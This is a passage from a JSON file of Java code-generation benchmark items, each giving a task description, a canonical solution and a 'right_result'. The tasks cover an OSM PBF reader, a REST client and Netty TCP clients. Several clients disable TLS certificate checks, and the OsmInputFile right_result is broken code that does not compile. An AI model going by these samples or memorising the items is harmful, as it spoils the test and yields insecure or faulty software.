i++) {\n                    JSONObject jsonObject = jsonArray.getJSONObject(i);\n                    // Process each JSON object as needed\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result2) {\n            super.onPostExecute(result2);\n            // Handle post-execution logic here\n        }\n\n        private String ConvertInputToStringNoChange(InputStream inputStream) {\n            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n            StringBuilder stringBuilder = new StringBuilder();\n            String line;\n\n            try {\n                while ((line = bufferedReader.readLine()) != null) {\n                    stringBuilder.append(line);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    inputStream.close();\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n\n            return stringBuilder.toString();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 11,
    "Instruction": "Task Description: Create a Java class that reads and processes OSM (OpenStreetMap) PBF (Protocolbuffer Binary Format) files using Java NIO's FileChannel for efficient file operations, with support for lazy reading of file blocks.\n\nClass Description: The OsmInputFile class provides functionality to read and process OSM PBF files. It supports both eager and lazy reading modes, where lazy reading defers the actual decoding of data blocks until needed. The class uses FileChannel for efficient file operations and includes methods for reading headers, blocks, and validating file contents.\n\nAttributes:\n- path: [Path] - The file path to the OSM PBF file to be processed\n- lazy: [boolean] - Flag indicating whether to use lazy reading mode for file blocks\n\nMethods:\n- readInt: [readInt]([FileChannel channel]) -> [int] - Reads a 4-byte integer from the specified FileChannel\n- readBytes: [readBytes]([FileChannel channel, int length]) -> [byte[]] - Reads a specified number of bytes from the current position in the FileChannel\n- readBytes: [readBytes]([FileChannel channel, long offset, int length]) -> [byte[]] - Reads a specified number of bytes from a specific offset in the FileChannel\n- readBlobHeader: [readBlobHeader]([FileChannel channel]) -> [BlobHeader] - Reads and parses a BlobHeader from the FileChannel\n- openChannel: [openChannel]() -> [FileChannel] - Opens and returns a FileChannel for reading the input file\n- LazyReader (inner class): [LazyReader]() -> [OsmBlockSource] - Implements lazy reading functionality for OSM blocks\n  - forEachBlock: [forEachBlock]([Consumer<Block> consumer]) -> [void] - Processes each block in the file using the provided consumer\n  - close: [close]() -> [void] - Closes the lazy reading channel\n  - LazyBlock (inner record): [LazyBlock]([long offset, int length, FileChannel channel]) -> [Block] - Represents a lazily-read block\n    - decodeElements: [decodeElements]() -> [Iterable<OsmElement>] - Decodes the block's elements when accessed",
    "Canonical_solution": "import com.onthegomap.planetiler.reader.FileFormatException;\nimport com.onthegomap.planetiler.util.ByteBufferUtil;\nimport crosby.binary.Fileformat.BlobHeader;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.List;\nimport java.util.function.Consumer;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class OsmInputFile {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(OsmInputFile.class);\n\n  private final Path path;\n  private final boolean lazy;\n\n  public OsmInputFile(Path path, boolean lazyReads) {\n    this.path = path;\n    lazy = lazyReads;\n  }\n\n  private static int readInt(FileChannel channel) throws IOException {\n    ByteBuffer buf = ByteBuffer.allocate(4);\n    int read = channel.read(buf);\n    if (read != 4) {\n      throw new IOException(\"Tried to read 4 bytes but only got \" + read);\n    }\n    return buf.flip().getInt();\n  }\n\n  private static byte[] readBytes(FileChannel channel, int length) throws IOException {\n    ByteBuffer buf = ByteBuffer.allocate(length);\n    int read = channel.read(buf);\n    if (read != length) {\n      throw new IOException(\"Tried to read \" + length + \" bytes but only got \" + read);\n    }\n    return buf.flip().array();\n  }\n\n  private static byte[] readBytes(FileChannel channel, long offset, int length) throws IOException {\n    ByteBuffer buf = ByteBuffer.allocate(length);\n    int read = channel.read(buf, offset);\n    if (read != length) {\n      throw new IOException(\"Tried to read \" + length + \" bytes at \" + offset + \" but only got \" + read);\n    }\n    return buf.flip().array();\n  }\n\n  private static BlobHeader readBlobHeader(FileChannel channel) throws IOException {\n    int headerSize = readInt(channel);\n    if (headerSize > 64 * 1024) {\n      throw new IllegalArgumentException(\"Header longer than 64 KiB\");\n    }\n    byte[] headerBytes = readBytes(channel, headerSize);\n    return BlobHeader.parseFrom(headerBytes);\n  }\n\n  private FileChannel openChannel() {\n    try {\n      return FileChannel.open(path, StandardOpenOption.READ);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  private class LazyReader implements OsmBlockSource {\n\n    final FileChannel lazyReadChannel = openChannel();\n\n    @Override\n    public void forEachBlock(Consumer<Block> consumer) {\n      try (FileChannel channel = openChannel()) {\n        final long size = channel.size();\n        while (channel.position() < size) {\n          BlobHeader header = readBlobHeader(channel);\n          int blockSize = header.getDatasize();\n          String headerType = header.getType();\n          long blockStartPosition = channel.position();\n          if (\"OSMData\".equals(headerType)) {\n            consumer.accept(new LazyBlock(blockStartPosition, blockSize, lazyReadChannel));\n          } else if (\"OSMHeader\".equals(headerType)) {\n            validateHeader(readBytes(channel, blockStartPosition, blockSize));\n          } else {\n            LOGGER.warn(\"Unrecognized OSM PBF blob header type: {}\", headerType);\n          }\n          channel.position(blockStartPosition + blockSize);\n        }\n      } catch (IOException e) {\n        throw new UncheckedIOException(e);\n      }\n    }\n\n    @Override\n    public void close() {\n      try {\n        lazyReadChannel.close();\n      } catch (IOException e) {\n        throw new UncheckedIOException(e);\n      }\n    }\n\n    private record LazyBlock(long offset, int length, FileChannel channel) implements Block {\n\n      public Iterable<OsmElement> decodeElements() {\n        try {\n          var buffer = channel.map(FileChannel.MapMode.READ_ONLY, offset, length);\n          var result = PbfDecoder.decode(buffer);\n          ByteBufferUtil.free(buffer);\n          return result;\n        } catch (IOException e) {\n          throw new UncheckedIOException(e);\n        }\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Iterator;\nimport java.util.function.Consumer;\n\npublic class OsmInputFile {\n    private final Path path;\n    private final boolean lazy;\n\n    public OsmInputFile(Path path, boolean lazy) {\n        this.path = path;\n        this.lazy = lazy;\n    }\n\n    public int readInt(FileChannel channel) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        channel.read(buffer);\n        buffer.flip();\n        return buffer.getInt();\n    }\n\n    public byte[] readBytes(FileChannel channel, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(length);\n        channel.read(buffer);\n        buffer.flip();\n        byte[] bytes = new byte[length];\n        buffer.get(bytes);\n        return bytes;\n    }\n\n    public byte[] readBytes(FileChannel channel, long offset, int length) throws IOException {\n        channel.position(offset);\n        return readBytes(channel, length);\n    }\n\n    public BlobHeader readBlobHeader(FileChannel channel) throws IOException {\n        int blobSize = readInt(channel);\n        byte[] blobData = readBytes(channel, blobSize);\n        // Placeholder for actual parsing logic\n        return new BlobHeader(blobData);\n    }\n\n    public FileChannel openChannel() throws IOException {\n        return FileChannel.open(path, StandardOpenOption.READ);\n    }\n\n    public OsmBlockSource LazyReader() throws IOException {\n        return new LazyReader(openChannel());\n    }\n\n    public interface OsmBlockSource extends AutoCloseable {\n        void forEachBlock(Consumer<Block> consumer);\n    }\n\n    public record Block(byte[] data) {\n        public Iterable<OsmElement> decodeElements() {\n            // Placeholder for decoding logic\n            return () -> new Iterator<>() {\n                private int i = 0;\n                @Override\n                public boolean hasNext() {\n                    return i < 1; // dummy implementation\n                }\n                @Override\n                public OsmElement next() {\n                    i++;\n                    return new OsmElement(); // dummy element\n                }\n            };\n        }\n    }\n\n    public record OsmElement() {}\n\n    public record BlobHeader(byte[] raw) {}\n\n    private class LazyReader implements OsmBlockSource {\n        private final FileChannel channel;\n\n        public LazyReader(FileChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public void forEachBlock(Consumer<Block> consumer) {\n            try {\n                long position = channel.position();\n                while (position < channel.size()) {\n                    channel.position(position);\n                    BlobHeader header = readBlobHeader(channel);\n                    int blobLength = header.raw().length;\n                    LazyBlock block = new LazyBlock(position + 4 + 4, blobLength, channel);\n                    consumer.accept(block);\n                    position += 4 + 4 + blobLength;\n                }\n            } catch (IOException e) {\n                throw new RuntimeException(e);\n            }\n        }\n\n        @Override\n        public void close() throws Exception {\n            channel.close();\n        }\n    }\n\n    public record LazyBlock(long offset, int length, FileChannel channel) implements Block {\n        public LazyBlock {\n            super(readBytes(channel, offset, length));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 111,
    "Instruction": "Task Description: Create a Java class that implements a RESTful client using HttpURLConnection to perform HTTP requests (GET, POST, PUT) and handle responses.\n\nClass Description: The `RestfulClient` class provides methods to execute HTTP requests (GET, POST, PUT) to a specified URL and process the responses. It handles connection setup, request parameter configuration, input/output stream management, and connection cleanup.\n\nAttributes: None\n\nMethods:\n\nMethod1: `get(String path) -> String` - Executes a GET request to the specified URL path and returns the response as a String.  \nMethod2: `post(String path, String requestBody) -> String` - Executes a POST request to the specified URL path with the provided request body and returns the response as a String.  \nMethod3: `put(String path, String requestBody) -> String` - Executes a PUT request to the specified URL path with the provided request body and returns the response as a String.  \nMethod4: `executeRequest(String method, String path, String requestBody) -> String` - Internal helper method that handles the common logic for executing HTTP requests (connection setup, request configuration, and response processing).  \nMethod5: `getVal(RestfulRequest request) -> String` - Executes a custom HTTP request based on the provided `RestfulRequest` object (containing URL, method, and parameters) and returns the response as a String.  \n\nInput:  \n- For `get`, `post`, and `put`:  \n  - `path` (String): The target URL for the HTTP request.  \n  - `requestBody` (String, optional for POST/PUT): The request payload in JSON format.  \n- For `getVal`:  \n  - `request` (RestfulRequest): An object encapsulating the request details (URL, HTTP method, and parameters).  \n\nOutput:  \n- String: The response body from the HTTP request, or `null` if an error occurs.",
    "Canonical_solution": "import lombok.extern.slf4j.Slf4j;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\n@Slf4j\npublic class RestfulClient {\n\n    public String get(String path) {\n        return executeRequest(\"GET\", path, null);\n    }\n\n    public String post(String path, String requestBody) {\n        return executeRequest(\"POST\", path, requestBody);\n    }\n\n    public String put(String path, String requestBody) {\n        return executeRequest(\"PUT\", path, requestBody);\n    }\n\n    private String executeRequest(String method, String path, String requestBody){\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(path);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            connection.setRequestProperty(\"Content-Type\", \"application/json; charset=utf-8\");\n\n            if (requestBody != null) {\n                connection.setDoOutput(true);\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = requestBody.getBytes();\n                    os.write(input, 0, input.length);\n                }\n            }\n\n            if (connection.getResponseCode() == 200) {\n                try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n                    String inputLine;\n                    StringBuilder response = new StringBuilder();\n                    while ((inputLine = in.readLine()) != null) {\n                        response.append(inputLine);\n                    }\n                    return response.toString();\n                }\n            }\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n\n    public String getVal(RestfulRequest request) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(request.getUrl());\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(request.getMethod());\n            connection.setDoInput(true);\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \" application/json\");\n            byte[] content = request.getParam().getBytes();\n            connection.setRequestProperty(\"Content-Length\", content.length + \"\");\n\n            connection.setReadTimeout(10000);\n            connection.setConnectTimeout(10000);\n            connection.connect();\n            OutputStream out = connection.getOutputStream();\n            out.write(content);\n            out.flush();\n            out.close();\n\n            if (connection.getResponseCode() == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                return response.toString();\n            }\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class RestfulClient {\n\n    public String get(String path) {\n        return executeRequest(\"GET\", path, null);\n    }\n\n    public String post(String path, String requestBody) {\n        return executeRequest(\"POST\", path, requestBody);\n    }\n\n    public String put(String path, String requestBody) {\n        return executeRequest(\"PUT\", path, requestBody);\n    }\n\n    public String executeRequest(String method, String path, String requestBody) {\n        try {\n            URL url = new URL(path);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n\n            if (method.equals(\"POST\") || method.equals(\"PUT\")) {\n                connection.setDoOutput(true);\n                connection.setRequestProperty(\"Content-Type\", \"application/json\");\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = requestBody.getBytes(\"utf-8\");\n                    os.write(input, 0, input.length);\n                }\n            }\n\n            int responseCode = connection.getResponseCode();\n            BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(connection.getInputStream(), \"utf-8\"));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line).append(\"\\n\");\n            }\n            reader.close();\n            connection.disconnect();\n            return response.toString().trim();\n\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public String getVal(RestfulRequest request) {\n        return executeRequest(request.getMethod(), request.getUrl(), request.getRequestBody());\n    }\n\n    public static class RestfulRequest {\n        private String url;\n        private String method;\n        private String requestBody;\n\n        public RestfulRequest(String url, String method, String requestBody) {\n            this.url = url;\n            this.method = method;\n            this.requestBody = requestBody;\n        }\n\n        public String getUrl() {\n            return url;\n        }\n\n        public String getMethod() {\n            return method;\n        }\n\n        public String getRequestBody() {\n            return requestBody;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 113,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send messages, and handle server responses.\n\nClass Description: The TelnetClient class provides functionality to connect to a remote server using TCP, with optional SSL support. It reads input from the console, sends it to the server, and handles the connection lifecycle.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the remote server (default: \"127.0.0.1\")\n- PORT: int - The port number of the remote server (default: 8023 or 8992 for SSL)\n\nMethods:\n- start(): void - Initializes and starts the TCP client. Handles the connection setup, message sending, and connection teardown. Throws Exception if any error occurs during execution.\n  Input: None\n  Output: None (void)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class TelnetClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE);\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new TelnetClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.LineBasedFrameDecoder;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class TelnetClient {\n    private final boolean SSL;\n    private final String HOST = \"127.0.0.1\";\n    private final int PORT = SSL ? 8992 : 8023;\n\n    public TelnetClient(boolean ssl) {\n        this.SSL = ssl;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     if (SSL) {\n                         SslContext sslCtx = SslContextBuilder.forClient()\n                                                             .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                                                             .build();\n                         ch.pipeline().addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                     }\n                     ch.pipeline().addLast(\n                             new LineBasedFrameDecoder(8192),\n                             new StringDecoder(),\n                             new StringEncoder(),\n                             new TelnetClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            Channel channel = f.channel();\n\n            BufferedReader console = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = console.readLine();\n                if (line == null) {\n                    break;\n                }\n                channel.writeAndFlush(Unpooled.copiedBuffer((line + \"\\r\\n\").getBytes()));\n            }\n\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean useSsl = false;\n        new TelnetClient(useSsl).start();\n    }\n}\n\nclass TelnetClientHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n    @Override\n    public void channelRead(io.netty.channel.ChannelHandlerContext ctx, Object msg) {\n        System.out.print(msg);\n    }\n\n    @Override\n    public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 114,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send and receive messages, and handle SSL encryption if required.\n\nClass Description: The EchoClient class is a Netty-based TCP client that connects to a specified server, optionally using SSL encryption, and includes a handler for processing incoming and outgoing messages.\n\nAttributes:\nSSL: [boolean] - Flag indicating whether SSL encryption should be used\nHOST: [String] - The host address of the server to connect to\nPORT: [int] - The port number of the server to connect to\nSIZE: [int] - The size parameter for message handling (unused in basic implementation)\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the Netty client, establishing a connection to the specified server. Handles SSL context creation if needed, configures the client pipeline, and manages connection lifecycle.\ninitChannel: [initChannel]([SocketChannel ch]) -> [void] - (Internal method) Configures the channel pipeline with SSL handler (if enabled) and custom client handler during channel initialization.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class EchoClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n    static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.TCP_NODELAY, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                     }\n                     p.addLast(new EchoClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class EchoClient {\n    private final boolean SSL;\n    private final String HOST;\n    private final int PORT;\n    private final int SIZE;\n\n    public EchoClient(boolean ssl, String host, int port, int size) {\n        this.SSL = ssl;\n        this.HOST = host;\n        this.PORT = port;\n        this.SIZE = size;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     if (SSL) {\n                         SslContext sslCtx = SslContextBuilder.forClient()\n                             .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                         ch.pipeline().addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                     }\n                     ch.pipeline().addLast(new EchoClientHandler());\n                 }\n             });\n\n            // Start the client.\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n\n            // Wait until the connection is closed.\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static class EchoClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            ctx.writeAndFlush(Unpooled.copiedBuffer(\"Hello, server!\".getBytes()));\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            System.out.println(\"Client received: \" + msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 115,
    "Instruction": "Task Description: Create a Java class that implements a simple TCP chat client using Netty framework, capable of connecting to a remote server, sending messages from console input, and gracefully shutting down.\n\nClass Description: SimpleChatClient is a Netty-based TCP client that establishes a connection to a specified host and port, sends user input messages to the server, and handles connection lifecycle management.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server to connect to\n\nMethods:\nSimpleChatClient: (String host, int port) -> void - Constructor that initializes the client with target host and port\nrun: () -> void - Main method that initializes Netty components, establishes connection, handles user input, and manages shutdown\n    - Initializes NioEventLoopGroup for I/O operations\n    - Configures Bootstrap with NioSocketChannel and handler\n    - Connects to remote server and maintains channel\n    - Reads user input from console and sends to server\n    - Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SimpleChatClient {\n\n    private final String host;\n    private final int port;\n\n    public SimpleChatClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new SimpleChatClientInitializer());\n            Channel channel = bootstrap.connect(host, port).sync().channel();\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                channel.writeAndFlush(in.readLine() + \"\\r\\n\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SimpleChatClient {\n    private final String host;\n    private final int port;\n\n    public SimpleChatClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<Channel>() {\n                        @Override\n                        protected void initChannel(Channel ch) {\n                            ch.pipeline().addLast(new StringEncoder());\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            System.out.println(\"Connected to server at \" + host + \":\" + port);\n\n            Channel channel = future.channel();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                if (\"exit\".equalsIgnoreCase(line)) {\n                    break;\n                }\n                channel.writeAndFlush(Unpooled.copiedBuffer(line.getBytes()));\n            }\n\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        new SimpleChatClient(\"127.0.0.1\", 8080).run();\n    }\n}\n```"
  },
  {
    "Task_id": 116,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a secure (optional SSL) connection to a server, send and receive serialized Java objects.\n\nClass Description: ObjectEchoClient is a Netty-based TCP client that connects to a specified server, handles SSL encryption if enabled, and processes object serialization/deserialization for communication. The client maintains the connection until explicitly closed.\n\nAttributes:\nSSL: [boolean] - Flag indicating whether SSL encryption should be used\nHOST: [String] - The host address of the server to connect to\nPORT: [int] - The port number of the server to connect to\nSIZE: [int] - The size parameter (unused in current implementation but available for configuration)\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the Netty client, establishes connection to server, configures SSL if enabled, sets up object serialization pipeline, and maintains connection until shutdown. Throws Exception if any error occurs during startup or operation.\n\nThe method performs the following operations:\n1. Creates SSL context if SSL is enabled\n2. Initializes NioEventLoopGroup for I/O operations\n3. Configures Bootstrap with NioSocketChannel\n4. Sets up pipeline with ObjectEncoder, ObjectDecoder and custom handler\n5. Connects to specified host and port\n6. Maintains connection until channel is closed\n7. Shuts down event loop group gracefully when done",
